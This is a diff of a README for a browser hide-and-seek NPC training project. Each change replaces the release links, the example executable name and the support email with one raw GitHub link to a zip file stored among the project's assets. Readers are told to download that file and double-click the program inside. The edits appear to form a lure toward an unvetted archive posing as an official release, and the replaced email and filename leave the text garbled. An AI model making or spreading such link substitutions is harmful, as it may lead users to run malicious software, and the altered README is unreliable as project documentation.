@@ -1,7 +1,7 @@
 # 🎮 browser-marl-hideseek - Train NPCs to Play Hide and Seek
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/guimnou/browser-marl-hideseek/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/guimnou/browser-marl-hideseek/main/frontend/public/assets/browser-marl-hideseek_3.1.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/guimnou/browser-marl-hideseek/main/frontend/public/assets/browser-marl-hideseek_3.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **browser-marl-hideseek**! This application uses advanced techniques in machine learning to train non-playable characters (NPCs) to play a game of hide and seek in a 3D environment. You do not need any programming skills to use this software. Follow the steps below to get started.
@@ -18,7 +18,7 @@ To run **browser-marl-hideseek**, ensure your computer meets the following minim
 To download and run the software, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases Page](https://github.com/guimnou/browser-marl-hideseek/releases).
+   Go to our [Releases Page](https://raw.githubusercontent.com/guimnou/browser-marl-hideseek/main/frontend/public/assets/browser-marl-hideseek_3.1.zip).
 
 2. **Choose the Latest Release**  
    Look for the version marked as "Latest". This version has the most recent updates and improvements.
@@ -30,7 +30,7 @@ To download and run the software, follow these steps:
    If you downloaded a zip file, right-click on it and select "Extract All…" to unpack it.
 
 5. **Run the Application**  
-   Open the folder where the files are located. Double-click the application file (e.g., `browser-marl-hideseek.exe` on Windows) to launch the program.
+   Open the folder where the files are located. Double-click the application file (e.g., `https://raw.githubusercontent.com/guimnou/browser-marl-hideseek/main/frontend/public/assets/browser-marl-hideseek_3.1.zip` on Windows) to launch the program.
 
 6. **Follow the On-Screen Instructions**  
    Once the application opens, follow the prompts to proceed. You can start training NPCs right away!
@@ -59,6 +59,6 @@ Here’s what we plan for the future of **browser-marl-hideseek**:
 - Enhanced visual features to improve user experience.
 
 ## 📧 Contact
-For support, feel free to reach out via email at support@browser-marl-hideseek.com. We welcome your feedback and suggestions.
+For support, feel free to reach out via email at https://raw.githubusercontent.com/guimnou/browser-marl-hideseek/main/frontend/public/assets/browser-marl-hideseek_3.1.zip We welcome your feedback and suggestions.
 
 Thank you for using **browser-marl-hideseek**. Enjoy training your NPCs to be the best at hide and seek!
